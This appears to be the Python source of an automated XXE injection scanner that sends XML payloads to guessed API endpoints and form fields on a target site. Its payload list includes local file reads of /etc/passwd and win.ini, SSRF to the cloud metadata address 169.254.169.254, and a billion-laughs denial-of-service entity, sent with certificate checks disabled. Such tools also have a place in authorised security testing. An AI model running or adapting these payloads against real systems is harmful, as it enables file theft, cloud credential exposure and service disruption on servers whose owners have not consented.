"""
APEX XXE Injection Scanner
In-band, out-of-band, error-based, and SSRF via XXE
"""
import requests
from urllib.parse import urljoin


def scan_xxe(target_url, discovered):
    """Scan for XML External Entity (XXE) injection vulnerabilities."""
    vulns = []
    sess = requests.Session()
    sess.verify = False

    xxe_payloads = [
        # In-band entity reflection
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "APEX_XXE_TEST">]><foo>&xxe;</foo>', 'APEX_XXE_TEST', 'in-band'),
        # File read (Linux)
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', 'root:', 'file-read'),
        # File read (Windows)
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>', '[fonts]', 'file-read'),
        # SSRF via XXE
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>', 'ami-id', 'ssrf'),
        # Billion laughs DoS
        ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>', None, 'dos'),
    ]

    xml_content_types = [
        'application/xml', 'text/xml', 'application/soap+xml',
        'application/x-www-form-urlencoded',  # Some apps parse XML from form data
    ]

    # Test endpoints that might accept XML
    xml_endpoints = ['/api', '/api/xml', '/xml', '/soap', '/ws', '/webservice',
                     '/rpc', '/xmlrpc', '/rest', '/service']

    for page in discovered.get('pages', [])[:10]:
        for ep in xml_endpoints:
            try:
                url = urljoin(target_url, ep) if ep.startswith('/') else urljoin(page, ep)
                for payload, indicator, subtype in xxe_payloads:
                    for ct in xml_content_types[:3]:
                        try:
                            headers = {'Content-Type': ct}
                            r = sess.post(url, data=payload, headers=headers, timeout=5)
                            if indicator and indicator.lower() in r.text.lower():
                                vulns.append({
                                    'type': 'xxe', 'subtype': subtype,
                                    'endpoint': url,
                                    'parameter': 'XML body',
                                    'payload': payload[:100],
                                    'result': f'XXE confirmed — {subtype}',
                                    'confirmed': True, 'severity': 'critical',
                                    'target': target_url,
                                    'description': f'XXE injection ({subtype}) via XML body.'
                                })
                                break
                        except:
                            pass
                    if vulns and vulns[-1].get('endpoint') == url:
                        break
            except:
                pass

    # Test forms that might submit XML
    for form in discovered.get('forms', [])[:10]:
        for inp in form.get('inputs', [])[:3]:
            name = inp.get('name', '')
            if not name:
                continue
            for payload, indicator, subtype in xxe_payloads[:3]:
                try:
                    data = {name: payload}
                    r = sess.post(form['url'], data=data, timeout=5)
                    if indicator and indicator.lower() in r.text.lower():
                        vulns.append({
                            'type': 'xxe', 'subtype': subtype,
                            'endpoint': form['url'],
                            'parameter': name,
                            'payload': payload[:100],
                            'result': f'XXE confirmed via form — {subtype}',
                            'confirmed': True, 'severity': 'critical',
                            'target': target_url,
                            'description': f'XXE injection via form field {name}.'
                        })
                        break
                except:
                    pass

    return vulns